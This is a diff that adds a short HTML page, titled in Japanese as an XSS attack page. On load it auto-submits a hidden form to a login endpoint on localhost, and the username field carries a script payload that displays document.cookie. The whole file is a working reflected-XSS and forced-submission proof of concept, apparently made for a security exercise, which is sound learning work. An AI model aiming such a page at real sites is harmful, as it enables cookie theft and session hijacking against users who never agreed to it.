@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+    <title>XSS攻撃用HTML</title>
+  </head>
+  <body>
+    <form id="attackForm" action="http://localhost:8000/login" method="post">
+      <input type="hidden" id="username" name="username" value="<script>alert(document.cookie);</script>"/></td>
+      <input type="hidden" id="password" name="password" value="dummy"/></td>
+    </form>
+    <script>
+      window.onload = function(){
+        document.getElementById("attackForm").submit();
+      };
+    </script>
+  </body>
+</html>
